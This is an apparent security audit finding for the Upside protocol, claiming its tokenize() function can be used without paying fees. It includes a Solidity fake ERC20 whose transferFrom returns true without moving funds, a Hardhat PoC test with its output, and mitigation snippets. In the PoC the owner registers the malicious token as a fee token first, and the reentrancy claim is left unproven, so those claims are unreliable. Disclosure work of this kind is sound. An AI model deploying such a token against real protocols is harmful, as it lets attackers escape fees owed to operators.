## Title
Bypassing fees + Reentrancy on Upside protocol.

## Finding description
The protocol accepts any ERC20 token for fees without validating that the token actually transfers the required amount (it's not checking the amount received). A malicious token can implement transferFrom to always return true without transferring any tokens.

~Based on this finding reentrancy is also possible, we use the callback mechanism to reenter the function, this will not be proved here because reentrancy and fee bypass share the same root cause: The protocol accepts any ERC20 token without proper validation of its behavior.

## Impact
- Attackers can tokenize URLs without paying any fees
- Protocol loses revenue from tokenization fees
- No tokens are actually transferred despite the protocol considering the fee paid

## Recommended mitigation steps
1 - Balance Verification
2 - Use a Token whitelist

Example to add balance verification

```solidity
 // Add balance verification
        uint256 feeAmount = tokenizeFeeMap[_tokenizeFeeAddress];
        uint256 ownerBalanceBefore = IERC20Metadata(_tokenizeFeeAddress).balanceOf(fee.tokenizeFeeDestinationAddress);
```

Example for token Whitelist
```solidity
// Add to contract state
mapping(address => bool) public whitelistedTokens;
mapping(address => uint256) public tokenizeFeeMap;


// Modify tokenize function
function tokenize(string calldata _url, address _tokenizeFeeAddress) external returns (address metaCoinAddress) {
    if (urlToMetaCoinMap[_url] != address(0)) {
        revert MetaCoinExists();
    }

    FeeInfo storage fee = feeInfo;

    if (fee.tokenizeFeeEnabled) {
        if (!whitelistedTokens[_tokenizeFeeAddress]) {   -> here you can add an extra step
            revert TokenNotWhitelisted();
        }
    }
}
```


## Proof of Concept

The test shows that an attacker can use a Malicious ERC20 deployed token with TransferFrom always returning true. Since tokenize() is not checking if any specific amount has been received, it validated the tx and therefore, an attacker can create a Metacoin without paying fees for all URLs possible

```bash
npx hardhat test test/FeeBypassVulnerability.test.ts


  Fee Bypass Vulnerability PoC

=== Test Setup ===
Owner address: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
Attacker address: 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
    Fee Bypass Scenarios

=== Normal Token Scenario ===
Normal token deployed at: 0x0165878A594ca255338adfa4d48449f69242Eb8F
Minted 2000 tokens to attacker
Tokenize fee set for normal token
Tokenize fee enabled
Using URL: https://example.com/normal-1747815647042
Attacker balance before: 2000000000000000000000
Owner balance before: 0
Attacker approved protocol to spend tokens
Attacker tokenized URL
MetaCoin address: 0x75537828f2ce51be7289709686A69CbFDbB714F1
Attacker balance after: 1000000000000000000000
Owner balance after: 1000000000000000000000
      ✔ should demonstrate normal token behavior

=== Malicious Token Scenario ===
Attacker address: 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
MaliciousTokenAlwaysTrue deployed at: 0x610178dA211FEF7D417bC0e6FeD39F05609AD788
Tokenize fee set for malicious token
Tokenize fee enabled
Using URL: https://example.com/always-true-1747815647063
Owner balance before tokenization: 1000000000000000000000000
Attacker balance before tokenization: 0

=== Attack Execution ===
1. Attacker initiating tokenize call...
2. Tokenize call completed
3. MetaCoin created at: 0xE451980132E65465d0a498c53f0b5227326Dd73F
4. Owner balance after tokenization: 1000000000000000000000000
5. Attacker balance after tokenization: 0

=== Attack Results ===
 MetaCoin successfully created
 No tokens were transferred
 Fee was bypassed
 Owner balance unchanged: 1000000000000000000000000
 Attacker balance unchanged: 0
      ✔ should demonstrate fee bypass with malicious token
```


Mock of the malicious token
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

contract MaliciousTokenAlwaysTrue is IERC20Metadata {
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;

    constructor() {
        _name = "Malicious Token";
        _symbol = "MAL";
        _decimals = 18;
        _mint(msg.sender, 1000000 * 10**18);
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        // Always return true but don't actually transfer tokens
        return true;
    }

    function _mint(address account, uint256 amount) internal {
        _totalSupply += amount;
        _balances[account] += amount;
    }
}
```

PoC
```typescript
import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import { ethers as hhethers } from "hardhat";
import { IERC20Metadata, UpsideMetaCoin, UpsideProtocol, UpsideStakingStub, USDCMock } from "../types";
import { expect } from "chai";

describe("Fee Bypass Vulnerability PoC", function () {
    let signers: HardhatEthersSigner[];
    let owner: HardhatEthersSigner;
    let user1: HardhatEthersSigner;
    let attacker: HardhatEthersSigner;

    let stakingContract: UpsideStakingStub;
    let upsideProtocol: UpsideProtocol;
    let liquidityToken: USDCMock;
    let maliciousToken: any;

    before(async function () {
        signers = await hhethers.getSigners();
        owner = signers[0];
        user1 = signers[1];
        attacker = signers[2];

        console.log("\n=== Test Setup ===");
        console.log("Owner address:", await owner.getAddress());
        console.log("Attacker address:", await attacker.getAddress());

        // Deploy contracts
        const stakingFactory = await hhethers.getContractFactory("UpsideStakingStub");
        stakingContract = await stakingFactory.deploy(owner.address);
        await stakingContract.setFeeDestinationAddress(owner.address);

        const protocolFactory = await hhethers.getContractFactory("UpsideProtocol");
        upsideProtocol = await protocolFactory.deploy(owner.address);

        const usdcFactory = await hhethers.getContractFactory("USDCMock");
        liquidityToken = await usdcFactory.deploy();

        // Initialize protocol
        await upsideProtocol.init(await liquidityToken.getAddress());
        await upsideProtocol.connect(owner).setStakingContractAddress(await stakingContract.getAddress());
    });

    describe("Fee Bypass Scenarios", function () {
        it("should demonstrate normal token behavior", async function () {
            console.log("\n=== Normal Token Scenario ===");
            // Deploy normal ERC20 token
            const normalTokenFactory = await hhethers.getContractFactory("USDCMock");
            const normalToken = await normalTokenFactory.deploy();
            console.log("Normal token deployed at:", await normalToken.getAddress());

            // Mint tokens to attacker
            await normalToken.mint(await attacker.getAddress(), hhethers.parseUnits("2000", 18));
            console.log("Minted 2000 tokens to attacker");

            // Owner sets fee for normal token
            await upsideProtocol.connect(owner).setTokenizeFee(
                await normalToken.getAddress(),
                hhethers.parseUnits("1000", 18)
            );
            console.log("Tokenize fee set for normal token");

            // Enable tokenize fee
            await upsideProtocol.connect(owner).setFeeInfo({
                tokenizeFeeEnabled: true,
                tokenizeFeeDestinationAddress: await owner.getAddress(),
                swapFeeStartingBp: 1000,
                swapFeeDecayBp: 100,
                swapFeeDecayInterval: 3600,
                swapFeeFinalBp: 100,
                swapFeeSellBp: 500,
                swapFeeDeployerBp: 2000
            });
            console.log("Tokenize fee enabled");

            // Use a unique URL for this test
            const url = "https://example.com/normal-" + Date.now();
            console.log("Using URL:", url);

            // Record balances before
            const attackerBalanceBefore = await normalToken.balanceOf(await attacker.getAddress());
            const ownerBalanceBefore = await normalToken.balanceOf(await owner.getAddress());
            console.log("Attacker balance before:", attackerBalanceBefore.toString());
            console.log("Owner balance before:", ownerBalanceBefore.toString());

            // Attacker approves and tokenizes
            await normalToken.connect(attacker).approve(await upsideProtocol.getAddress(), hhethers.parseUnits("1000", 18));
            console.log("Attacker approved protocol to spend tokens");
            await upsideProtocol.connect(attacker).tokenize(
                url,
                await normalToken.getAddress()
            );
            console.log("Attacker tokenized URL");

            // Verify tokenization succeeded
            const metaCoinAddress = await upsideProtocol.urlToMetaCoinMap(url);
            console.log("MetaCoin address:", metaCoinAddress);
            expect(metaCoinAddress).to.not.equal(hhethers.ZeroAddress);

            // Verify balances after
            const attackerBalanceAfter = await normalToken.balanceOf(await attacker.getAddress());
            const ownerBalanceAfter = await normalToken.balanceOf(await owner.getAddress());
            console.log("Attacker balance after:", attackerBalanceAfter.toString());
            console.log("Owner balance after:", ownerBalanceAfter.toString());
            
            // Verify fee was actually paid
            expect(attackerBalanceAfter).to.equal(attackerBalanceBefore - hhethers.parseUnits("1000", 18));
            expect(ownerBalanceAfter).to.equal(ownerBalanceBefore + hhethers.parseUnits("1000", 18));
        });

        it("should demonstrate fee bypass with malicious token", async function () {
            console.log("\n=== Malicious Token Scenario ===");
            console.log("Attacker address:", await attacker.getAddress());
            
            // Deploy malicious token that always returns true for transferFrom
            const maliciousTokenFactory = await hhethers.getContractFactory("MaliciousTokenAlwaysTrue");
            maliciousToken = await maliciousTokenFactory.deploy();
            console.log("MaliciousTokenAlwaysTrue deployed at:", await maliciousToken.getAddress());

            // Owner sets fee for malicious token
            await upsideProtocol.connect(owner).setTokenizeFee(
                await maliciousToken.getAddress(),
                hhethers.parseUnits("1000", 18)
            );
            console.log("Tokenize fee set for malicious token");

            // Enable tokenize fee
            await upsideProtocol.connect(owner).setFeeInfo({
                tokenizeFeeEnabled: true,
                tokenizeFeeDestinationAddress: await owner.getAddress(),
                swapFeeStartingBp: 1000,
                swapFeeDecayBp: 100,
                swapFeeDecayInterval: 3600,
                swapFeeFinalBp: 100,
                swapFeeSellBp: 500,
                swapFeeDeployerBp: 2000
            });
            console.log("Tokenize fee enabled");

            // Use a unique URL for this test
            const url = "https://example.com/always-true-" + Date.now();
            console.log("Using URL:", url);

            // Record balances before
            const ownerBalanceBefore = await maliciousToken.balanceOf(await owner.getAddress());
            const attackerBalanceBefore = await maliciousToken.balanceOf(await attacker.getAddress());
            console.log("Owner balance before tokenization:", ownerBalanceBefore.toString());
            console.log("Attacker balance before tokenization:", attackerBalanceBefore.toString());

            console.log("\n=== Attack Execution ===");
            console.log("1. Attacker initiating tokenize call...");
            // Attacker tokenizes without actually paying fee
            await upsideProtocol.connect(attacker).tokenize(
                url,
                await maliciousToken.getAddress()
            );
            console.log("2. Tokenize call completed");

            // Verify tokenization succeeded
            const metaCoinAddress = await upsideProtocol.urlToMetaCoinMap(url);
            console.log("3. MetaCoin created at:", metaCoinAddress);
            expect(metaCoinAddress).to.not.equal(hhethers.ZeroAddress);

            // Verify balances after
            const ownerBalanceAfter = await maliciousToken.balanceOf(await owner.getAddress());
            const attackerBalanceAfter = await maliciousToken.balanceOf(await attacker.getAddress());
            console.log("4. Owner balance after tokenization:", ownerBalanceAfter.toString());
            console.log("5. Attacker balance after tokenization:", attackerBalanceAfter.toString());
            expect(ownerBalanceAfter).to.equal(ownerBalanceBefore);

            console.log("\n=== Attack Results ===");
            console.log("MetaCoin successfully created");
            console.log("No tokens were transferred");
            console.log("Fee was bypassed");
            console.log("Owner balance unchanged:", ownerBalanceAfter.toString());
            console.log("Attacker balance unchanged:", attackerBalanceAfter.toString());
        });
    });
});
```

## github line affected
https://github.com/code-423n4/2025-05-upside/blob/main/contracts/UpsideProtocol.sol#L117-L159
